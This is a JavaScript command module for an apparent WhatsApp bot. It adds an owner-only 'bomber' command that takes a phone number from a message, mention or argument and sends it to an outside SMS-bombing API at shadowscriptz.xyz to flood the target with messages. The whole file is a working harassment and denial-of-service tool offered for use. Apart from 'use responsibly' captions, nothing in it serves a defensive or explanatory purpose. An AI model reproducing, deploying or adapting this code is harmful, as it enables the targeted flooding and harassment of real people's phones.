const { cmd } = require("../command");
const fetch = require("node-fetch");
const config = require('../config');

cmd({
  pattern: "bomber",
  alias: ["smsbomb"],
  react: "💣",
  desc: "Trigger SMS bombing (Owner Only)",
  category: "main",
  filename: __filename
}, async (conn, mek, m, { from, isCreator, reply }) => {
  try {
    // Owner check
    if (!isCreator) {
      return await conn.sendMessage(from, {
        image: { url: config.BOTIMAGE || 'https://mrfrankk-cdn.hf.space/mrfrank/mini/bomber.png' },
        caption: `❌ *Access Denied*\n\nOnly bot owner can use this command!\n\n${config.FOOTER || '© Created By Mr Frank OFC'}`
      }, { quoted: mek });
    }

    // Get target number
    const targetJid =
      m.quoted?.sender ||
      m.mentionedJid?.[0] ||
      m.text.split(" ")[1];

    if (!targetJid) {
      return await conn.sendMessage(from, {
        image: { url: config.BOTIMAGE || 'https://mrfrankk-cdn.hf.space/mrfrank/mini/bomber.png' },
        caption: `💣 *SMS Bomber*\n\n📌 Usage: ${config.PREFIX || '.'}bomber 263xxxxxxxx\n\n⚠️ Use responsibly!\n\n${config.FOOTER || '© Created By Mr Frank OFC'}`
      }, { quoted: mek });
    }

    const number = targetJid.replace("@s.whatsapp.net", "");
    
    // Send processing message
    await conn.sendMessage(from, {
      image: { url: config.BOTIMAGE || 'https://mrfrankk-cdn.hf.space/mrfrank/mini/bomber.png' },
      caption: `💣 *Starting SMS Bombing...*\n\n📱 *Target:* ${number}\n\n⏳ Please wait...\n\n${config.FOOTER || '© Created By Mr Frank OFC'}`
    }, { quoted: mek });

    const apiUrl = `https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=${number}`;

    // Call API
    const response = await fetch(apiUrl);
    if (response.ok) {
      await conn.sendMessage(from, {
        image: { url: config.BOTIMAGE || 'https://mrfrankk-cdn.hf.space/mrfrank/mini/bomber.png' },
        caption: `✅ *SMS Bombing Started!*\n\n📱 *Target:* ${number}\n\n⚠️ *Note:* Use responsibly and ethically!\n\n${config.FOOTER || '© Created By Mr Frank OFC'}`
      }, { quoted: mek });
    } else {
      await conn.sendMessage(from, {
        image: { url: config.BOTIMAGE || 'https://mrfrankk-cdn.hf.space/mrfrank/mini/bomber.png' },
        caption: `❌ *API Failed*\n\nStatus: ${response.status}\n\nPlease try again later.\n\n${config.FOOTER || '© Created By Mr Frank OFC'}`
      }, { quoted: mek });
    }

  } catch (error) {
    console.error(error);
    await conn.sendMessage(from, {
      image: { url: config.BOTIMAGE || 'https://mrfrankk-cdn.hf.space/mrfrank/mini/bomber.png' },
      caption: `❌ *Error Occurred*\n\n${error.message}\n\nPlease try again later.\n\n${config.FOOTER || '© Created By Mr Frank OFC'}`
    }, { quoted: mek });
  }
});
